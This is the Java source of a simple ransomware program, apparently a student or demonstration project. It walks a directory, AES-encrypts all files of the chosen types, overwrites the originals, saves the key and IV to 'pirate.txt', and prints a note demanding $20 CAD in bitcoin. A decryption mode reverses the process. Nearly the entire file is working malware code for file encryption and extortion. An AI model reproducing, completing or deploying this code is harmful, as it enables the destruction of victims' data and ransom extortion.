/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ransomware;
import commandLineArgsParser.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 *
 * @author Pierre-Marc Bonneau
 */
public class main {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws NoSuchAlgorithmException, IOException 
    {
        // Command line arguments parser usage is based from:
        // https://stackoverflow.com/questions/367706/how-to-parse-command-line-arguments-in-java
        // Using Apache Commons CLI
        Options options = new Options();

        Option optFileType = new Option("t", "type", true, "file type");
        optFileType.setRequired(false);
        options.addOption(optFileType);
        
        Option optInputDirectory = new Option("r", "directory", true, "input directory");
        optInputDirectory.setRequired(false);
        options.addOption(optInputDirectory);
        
        Option optDecryptionInfoPath = new Option("d", "decryption", true, "decryption info path");
        optDecryptionInfoPath.setRequired(false);
        options.addOption(optDecryptionInfoPath);
        
        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine cmd;

        try 
        {
            cmd = parser.parse(options, args);
        } 
        catch (ParseException e) {
            System.out.println(e.getMessage());
            formatter.printHelp("utility-name", options);

            System.exit(1);
            return;
        }

        String[] FileTypesArray = cmd.getOptionValues("type");   
        String InputDirectory  = cmd.getOptionValue("directory");
        String DecryptionInfoPath  = cmd.getOptionValue("decryption");
        
        if (DecryptionInfoPath == null)
        {
            IvParameterSpec IV = generateIV();
            SecretKey EncryptionKey = generateKey();
            Path path = Paths.get(InputDirectory);
            
            List<String> files = new ArrayList<String>();
            List<String> FilesToEncrypt = new ArrayList<String>();
            
            Files.walk(path).forEach(filepath -> files.add(filepath.toString()));
            
            for(int i = 0; i < files.size(); i++)
            {
                for (int j = 0; j < FileTypesArray.length; j++)
                {
                    if (files.get(i).contains("." + FileTypesArray[j]))
                    {
                        FilesToEncrypt.add(files.get(i));
                    }
                }
            }
            
            for (int i = 0; i < FilesToEncrypt.size(); i++)
            {
                Path FilePath = Paths.get(FilesToEncrypt.get(i));
                byte[] FileData = Files.readAllBytes(FilePath);
                doEncryption(FileData, EncryptionKey, IV, FilePath.toString() + ".enc");
                
                File file = new File(FilePath.toString());
                file.delete();
                
                File fileB = new File(FilePath.toString() + ".enc");
                fileB.renameTo(file);
            }
            
            byte[] KeyBytes = EncryptionKey.getEncoded();
            byte[] IVBytes = IV.getIV();
            String KeyData = Base64.getEncoder().encodeToString(EncryptionKey.getEncoded());
            String IVData = Base64.getEncoder().encodeToString(IVBytes);
            
            FileWriter writefile = new FileWriter(InputDirectory + "/pirate.txt", true);
            writefile.write(IVData);
            writefile.write("\n");
            writefile.write(KeyData);
            writefile.close();
            
            System.out.println("This computer has been compromised, some of your files have been encrypted. You must pay $20cad in bitcoins to [bitcoin wallet] for unlock your files.");
        }
        else
        {
            Path path = Paths.get(DecryptionInfoPath);
            
            String sDecryptionIV = Files.readAllLines(path).get(0);
            String sDecryptionKey = Files.readAllLines(path).get(1);
            
            byte[] IVBytes = Base64.getDecoder().decode(sDecryptionIV);
            IvParameterSpec IV = new IvParameterSpec(IVBytes);
            
            byte[] KeyBytes = Base64.getDecoder().decode(sDecryptionKey);
            SecretKey DecryptionKey = new SecretKeySpec(KeyBytes, 0, KeyBytes.length, "AES");
            
            List<String> files = new ArrayList<String>();
            List<String> FilesToDecrypt = new ArrayList<String>();
            
            String DecryptionPath = InputDirectory;
            path = Paths.get(DecryptionPath);
            
            Files.walk(path).forEach(filepath -> files.add(filepath.toString()));
            
            for(int i = 0; i < files.size(); i++)
            {
                for (int j = 0; j < FileTypesArray.length; j++)
                {
                    if (files.get(i).contains("." + FileTypesArray[j]))
                    {
                        FilesToDecrypt.add(files.get(i));
                    }
                }
            }
            
            for (int i = 0; i < FilesToDecrypt.size(); i++)
            {
                Path FilePath = Paths.get(FilesToDecrypt.get(i));
                byte[] FileData = Files.readAllBytes(FilePath);
                doEncryption(FileData, DecryptionKey, IV, FilePath.toString() + ".dec");
                
                File file = new File(FilePath.toString());
                file.delete();
                
                File fileB = new File(FilePath.toString() + ".dec");
                fileB.renameTo(file);
            }
        }
    }
    
    public static void doEncryption(byte[] FileData, SecretKey key, IvParameterSpec iv, String EncryptedFileOutputPath)
    {
        try
        {
            Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
                  
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);
  
            byte[] encryptedData = cipher.doFinal(FileData);
            
            FileOutputStream fos = new FileOutputStream(EncryptedFileOutputPath);
            
            fos.write(encryptedData);
            
            fos.close();
        }
        catch (Exception e)
        {   
            System.out.println("Error while encrypting: " + e.toString());
        }
    }
    
    public static void doDecryption(byte[] EncryptedFileData, SecretKey key, IvParameterSpec iv, String DecryptedFileOutputPath)
    {
        try
        {
            Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
                  
            cipher.init(Cipher.DECRYPT_MODE, key, iv);
  
            byte[] decryptedData = cipher.doFinal(EncryptedFileData);
            
            FileOutputStream fos = new FileOutputStream(DecryptedFileOutputPath);
            
            fos.write(decryptedData);
            
            fos.close();
        }
        catch (Exception e)
        {   
            System.out.println("Error while encrypting: " + e.toString());
        }
    }
    
    //https://stackoverflow.com/questions/5355466/converting-secret-key-into-a-string-and-vice-versa
    public static IvParameterSpec generateIV() throws NoSuchAlgorithmException
    {
        SecureRandom random = new SecureRandom();
        byte[] iv0 = random.generateSeed(16);
        IvParameterSpec iv = new IvParameterSpec(iv0);
        return iv;
    }
    
    public static SecretKey generateKey() throws NoSuchAlgorithmException
    {
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
	keyGenerator.init(128);
	SecretKey DecryptionKey = keyGenerator.generateKey();
        return DecryptionKey;
    }
    
}
